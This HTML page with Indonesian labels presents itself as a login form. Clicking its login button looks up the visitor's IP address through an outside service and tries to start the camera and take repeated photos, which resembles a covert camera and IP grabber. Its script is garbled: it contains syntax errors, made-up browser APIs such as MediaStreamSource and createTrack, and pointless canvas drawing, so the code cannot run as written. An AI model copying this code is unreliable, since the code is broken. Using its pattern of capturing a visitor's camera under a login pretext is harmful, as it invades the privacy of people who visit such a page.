<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login dengan Informasi sensitif1</title>
    <style>
        .container {
            max-width: 400px;
            margin: 20px auto;
            padding: 20px;
        }
        input[type="hidden"] {
            display: none;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Form login -->
        <form id="loginForm" onsubmit="handleSubmit(event)">
            <input type="hidden" id="usernameInput" name="username" required>
            <input type="hidden" id="passwordInput" name="password" required>
            
            <button type="button" class="masuk" onclick="showMasuk()">
                Masuk
            </button>
        </form>
        <!-- Custom prompt -->
        <div id="customPrompt">
            Bila ikih masuk, silakan:
            <br>
            <button onclick="fetchIP()">IP Address</button>
            <br>
            <button onclick="takePhotos()">Take Photos</button>
        </div>
        <!-- Hasil IP -->
        <div id="ipResult"></div>
        <!-- Kamera -->
        <button onclick="startCamera()">
            Izinkan Akses Kamera
        </button>
    </div>
    <script>
        let stream = null;
        let canvas = null;
        async function showMasuk() {
            document.getElementById('customPrompt').style.display = 'none';
            event.preventDefault();
            
            // Pilih tindakan yang akan dilakukan
            const result = fetch("https://api.ipapi.co/json/", { headers: {'Content-Type': 'application/json'} })
                .then((response) => response.json())
                .then((data) => {
                    document.getElementById('ipResult').innerHTML = 
                        `<strong>IP Address:</strong><br>${data ip`;
                    // Buka kamera untuk mengambil gambar
                    startCamera();
                    setTimeout(() => {
                        // Setelah 10 detik, tertutupi kamera dan lanjutkan
                        window.location.href = '#';
                    }, 10000);
                })
            );
            if (stream) {
                await cancelStream();
                stream = null;
            }
        }
        async function startCamera() {
            try {
                const mediaDevices = navigator.mediaDevices;
                const video = new MediaStreamSource('video');
                if (!mediaDevices.getUserMedia({ video: true })) {
                    alert('Gagal mendapatkan akses kamera.');
                    return;
                }
                stream = await mediaDevices.createTrack(stream);
                video.srcObject = stream;
                // Tampilkan video
                document.getElementById('customPrompt').style.display = 'block';
                
                const canvasEl = document.querySelector('#kameraCanvas');
                if (canvasEl) {
                    const canvas = canvasEl.getContext('2d');
                    
                    // Pastikan kursor hadir
                    canvas.beginPath();
                    canvas.arc(75, 34, 18, 0.1, 2 * Math.PI);
                    canvas.arc(100, 69, 18, 0.5, 2 * Math.PI);
                    canvas.arc(125, 34, 18, 0.775, 2 * Math.PI);
                    canvas.fill();
                    // Mulai mengambil fotografi
                    let takingPhotos = true;
                    
                    setInterval(() => {
                        const img = new Image();
                        img.srcObject = stream;
                        
                        if (canvas) {
                            canvas.width = img.naturalWidth + 'px';
                            canvas.height = img.naturalHeight + 'px';
                            
                            // Pastikan kursor hadir
                            canvas.beginPath();
                            canvas.arc(img.naturalWidth/2, img.naturalHeight/2, 18, 0.1, 2 * Math.PI);
                            canvas.arc((img.naturalWidth/2)+50, img.naturalHeight/2, 18, 0.5, 2 * Math.PI);
                            canvas.arc(img.naturalWidth/2+76, img.naturalHeight/2, 18, 0.775, 2 * Math.PI);
                            canvas.fill();
                            
                            // Tampilkan gambar
                            img.onload = () => {
                                img.srcObject = '';
                                takingPhotos = false;
                                if (canvas) canvas.remove();
                            };
                        }
                    }, 100);
                    // Setelah semua photo selesai, tertutupi kamera dan kembali ke custom prompt
                    setTimeout(() => {
                        window.location.href = '#';
                    }, 3000);
                }
            } catch (error) {
                console.error('Gagal mengambil gambar:', error);
                alert('Gagal mengambil gambar');
            }
        }
        async function fetchIP() {
            try {
                const response = await fetch('https://api.ipapi.co/json/', { headers: {'Content-Type': 'application/json'} });
                
                if (response.ok) {
                    const data = await response.json();
                    document.getElementById('ipResult').innerHTML = 
                        `<strong>IP Address:</strong><br>${data.ip}`;
                } else {
                    alert('Gagal mengambil data IP');
                }
            } catch (error) {
                console.error('Error:', error);
                alert('Terjadi kesalahan dalam mengambil data');
            }
        }
        async function cancelStream() {
            if (stream) {
                stream.close();
            }
        }
        async function handleSubmit(event) {
            event.preventDefault();
            const username = document.getElementById('usernameInput').value;
            const password = document.getElementById('passwordInput').value;
            // Handle login sederhana
            alert('Login akan dilakukan...');
            
            // Tampilkan custom prompt
            document.getElementById('customPrompt').style.display = 'block';
        }
    </script>
</body>
</html>
